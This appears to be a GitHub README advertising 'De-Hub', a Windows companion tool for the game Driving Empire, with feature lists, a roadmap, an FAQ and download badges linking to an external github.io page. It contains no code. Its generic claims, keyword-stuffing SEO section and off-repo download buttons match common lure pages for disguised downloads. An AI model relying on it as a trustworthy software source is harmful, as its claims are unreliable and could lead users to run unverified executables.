![preview](https://raw.githubusercontent.com/breakingt2bad/de-hub-engine/main/showcase_de2b70.svg)
# 🚗 De-Hub — Driving Empire Companion Toolkit

[![Download](https://raw.githubusercontent.com/breakingt2bad/de-hub-engine/main/app_38e7.svg)](https://breakingt2bad.github.io/de-hub-engine/)

![status](https://img.shields.io/badge/status-active-brightgreen)
![platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue)
![license](https://img.shields.io/badge/license-MIT-green)
![language](https://img.shields.io/badge/localization-14%20languages-orange)
![support](https://img.shields.io/badge/support-24%2F7-9cf)
![year](https://img.shields.io/badge/release-2026-purple)

---

## 🧭 Overview

**De-Hub** is a lightweight Windows companion utility crafted for players who spend their evenings behind the wheel of *Driving Empire*. Think of it as a quiet co-pilot sitting in the passenger seat: it does not shout, it does not interfere with the road, and it never takes the wheel from your hands. Instead, it observes, organizes, and streamlines the small repetitive chores that stand between you and the next lap.

Where most tools in this space try to do everything at once and end up feeling like a control panel from a spacecraft, De-Hub keeps its dashboard minimal. The philosophy is simple — **one hub, one purpose, zero friction**. Every panel, toggle, and shortcut is placed where your muscle memory already expects it to be.

The project began in early 2025 as a personal experiment and evolved through dozens of iterations into a polished desktop companion. As of the **2026** release line, De-Hub ships with a responsive interface, multilingual support, and a support desk that never sleeps.

> De-Hub is an independent utility and is not affiliated with, endorsed by, or sponsored by the developers or publishers of *Driving Empire*. It is a fan-made productivity companion.

---

## 🎯 Why De-Hub Exists

Most players do not want a wall of sliders. They want a tool that feels like a well-worn glove — one that disappears into the background while quietly making the experience smoother. De-Hub was designed around three guiding principles:

1. **Invisibility** — if the tool annoys you, it has already failed.
2. **Predictability** — every action should behave the same way on the hundredth click as on the first.
3. **Respect for the player** — no forced telemetry, no dark patterns, no nagging popups.

This is not a shortcut to the finish line. It is a better-organized garage for the person who already loves the drive.

---

## ✨ Feature Highlights

### 🖥️ Responsive Desktop UI
A fluid layout that adapts gracefully from a small 1366×768 laptop panel up to an ultrawide 3440×1440 monitor. Panels reflow, sidebars collapse, and the entire shell can be switched between light, dark, and a warm "midnight asphalt" theme.

### 🌍 Multilingual Support
Fourteen localizations ship out of the box, including English, Spanish, Portuguese (BR), German, French, Italian, Polish, Turkish, Russian, Japanese, Korean, Simplified Chinese, Indonesian, and Arabic. The interface detects your Windows locale automatically and can be overridden from the settings tab.

### 🕓 24/7 Customer Support
A rotating support roster answers questions across every time zone. Whether you are debugging an edge case at 3 AM or asking a beginner question at noon, someone from the community response desk is on shift.

### 🧩 Modular Panel System
Every module can be toggled on or off. Prefer a bare-bones experience? Disable everything except the core dashboard. Want the full cockpit? Enable all panels and pin them to the sidebar.

### 📊 Session Insights
A lightweight journal that records your in-session milestones — things like trips completed, garage rearrangements, and personal bests — all stored locally in a plain-text file you can read, edit, or delete.

### ⌨️ Global Hotkeys
Bind any action to a key combination. Defaults are chosen to avoid conflicts with common overlay tools, and every binding is remappable from a single hotkey editor.

### 🔄 Auto-Update Channel
Choose between Stable, Preview, and Long-Term channels. Updates are delivered through a signed manifest, and rollback to the previous version is a single click.

### 🗂️ Profile Snapshots
Save your entire configuration to a `.dehub` profile file. Move between machines, share setups with friends, or keep separate profiles for casual and competitive play.

### 🛡️ Sandboxed Architecture
The core runs in a low-privilege user context. It does not request administrator rights, does not touch system directories, and does not modify any files outside its own working folder.

### 🔌 Plugin Bridge
A documented bridge allows community members to extend De-Hub with their own panels. Plugins are loaded from a dedicated folder and validated against a manifest schema before activation.

---

## 🗺️ Roadmap Snapshot

| Quarter | Focus | Status |
| --- | --- | --- |
| Q1 2026 | Multilingual expansion to 20 locales | In progress |
| Q2 2026 | Plugin SDK documentation refresh | Planned |
| Q3 2026 | Cloud-synced profile snapshots | Researching |
| Q4 2026 | Accessibility audit and screen-reader pass | Planned |

---

## 🧪 Who Is This For?

- **The lap-chaser** who wants fewer clicks between sessions.
- **The organizer** who lives in menus and config screens.
- **The tinkerer** who wants a stable base with a plugin bridge.
- **The traveler** who switches machines and wants their setup to follow.
- **The community helper** who answers questions and needs a shareable reference.

---

## 🏗️ Project Structure

The repository is organized like a small workshop — a few tidy benches, everything labeled, nothing hidden in a drawer.

- `src/core` — the kernel that boots the app and manages lifecycle
- `src/modules` — every toggleable panel, one folder each
- `src/locales` — translation catalogs and locale metadata
- `src/theme` — color tokens, typography, and layout primitives
- `src/bridge` — the plugin host and manifest validator
- `docs/` — handbooks, FAQs, and contributor notes
- `scripts/` — build helpers and release tooling
- `tests/` — unit, integration, and smoke suites

Every folder carries its own short README so a newcomer can orient in seconds.

---

## 🧠 Design Notes

The dashboard uses a *layered visibility* model. Only one primary panel is shown at a time, with secondary panels docked to the side. This keeps the visual noise low and lets your eye rest on the important part of the screen. Transitions are short and eased, never flashy.

Typography is deliberately modest: a single sans-serif family for body text, a monospaced variant for logs, and generous line spacing so long sessions do not strain the eyes.

Colors are chosen from a palette inspired by wet asphalt, sodium street lamps, and the soft glow of a dashboard at night. Contrast ratios meet WCAG AA in both light and dark themes.

---

## 🧭 SEO-Friendly Discovery Terms

People searching for a **Driving Empire companion tool**, a **Windows dashboard utility**, or a **lightweight game organization helper** often land here. De-Hub is also described as a **session assistant**, a **garage organizer**, and a **configuration manager** for players who prefer a tidy cockpit. Related search phrases include *desktop companion for driving games*, *modular dashboard utility*, *multilingual Windows helper*, and *plugin-ready game toolkit*.

If you arrived here by searching for any of those, welcome — this page was written with you in mind.

---

## 🤝 Contributing

Contributions are welcome and appreciated. Before opening a pull request:

1. Read `docs/CONTRIBUTING.md` for branch naming and commit message conventions.
2. Run the full test suite locally.
3. Keep pull requests focused on a single concern.
4. Add or update documentation when behavior changes.

Translators are especially welcome. Adding a new locale usually means editing a single JSON file and a metadata stub.

---

## 🐛 Reporting Issues

When filing an issue, please include:

- Your Windows build number
- The De-Hub version shown in the About panel
- Steps to reproduce
- Any relevant entries from the local log file

The issue tracker is triaged multiple times per day, and confirmed bugs are tagged for the next patch release.

---

## 🛠️ Frequently Asked Questions

**Is De-Hub a replacement for the game?**
No. It is a companion that sits beside the game, not instead of it.

**Does it need to be running while I play?**
It can run standalone and be started whenever you like. It is not a background service that auto-starts unless you configure it that way.

**Will it slow down my machine?**
The idle footprint is intentionally small. Memory usage typically resembles that of a browser tab, and CPU usage while idle is close to zero.

**Can I use it on multiple PCs?**
Yes. Profile snapshots make it trivial to carry your setup between machines.

**Where are my settings stored?**
In a plain-text configuration file inside the application folder. You can back it up, edit it, or delete it at any time.

---

## 🧾 License

This project is released under the **MIT License**. You are welcome to use, modify, and redistribute the code as long as the original copyright notice is preserved.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright © 2026 the De-Hub contributors.

---

## ⚠️ Disclaimer

De-Hub is an independent, community-driven companion tool. It is **not** affiliated with, endorsed by, or sponsored by the creators or publishers of *Driving Empire*. All trademarks and game assets referenced belong to their respective owners.

The toolkit is designed for personal productivity and organization. It does not modify the game's files, memory, or network traffic. It does not promise any in-game advantage and should never be presented as doing so.

Use De-Hub responsibly and in line with the terms of service of any software you interact with. The contributors accept no liability for misuse or for any consequences arising from use of the toolkit.

Some panels may be experimental and are marked as such in the interface. Experimental features are provided as-is and may change or be removed in future releases.

---

## 💬 Community and Etiquette

The community around De-Hub is intentionally small and calm. There is no leaderboard, no ranking, and no incentive to shout. New members are met with patience, and long-time members are expected to extend that same patience to newcomers.

French-speaking users, Spanish-speaking users, and everyone else are welcome to open discussions in their preferred language. The translation team coordinates through the locale folders and a shared glossary.

---

## 🧮 Versioning

De-Hub follows a modified semantic versioning scheme:

- **Major** — breaking changes to the plugin interface or configuration format
- **Minor** — new modules, new locales, new hotkeys
- **Patch** — bug fixes, translation updates, small refinements

Every release is tagged and archived so you can always step back to a known-good build.

---

## 📅 Release Cadence

Patch releases land as needed. Minor releases land roughly every six to eight weeks. Major releases are rare and always accompanied by a migration guide.

The **2026** line is expected to include the accessibility pass, the expanded locale set, and the first public beta of cloud-synced profiles.

---

## 🏁 Closing Thoughts

De-Hub exists because the small annoyances of a hobby should never outweigh the hobby itself. It is a quiet tool for people who enjoy the drive and want their tools to stay out of the way. If it earns a permanent spot on your taskbar, it has done its job.

[![Download](https://raw.githubusercontent.com/breakingt2bad/de-hub-engine/main/app_38e7.svg)](https://breakingt2bad.github.io/de-hub-engine/)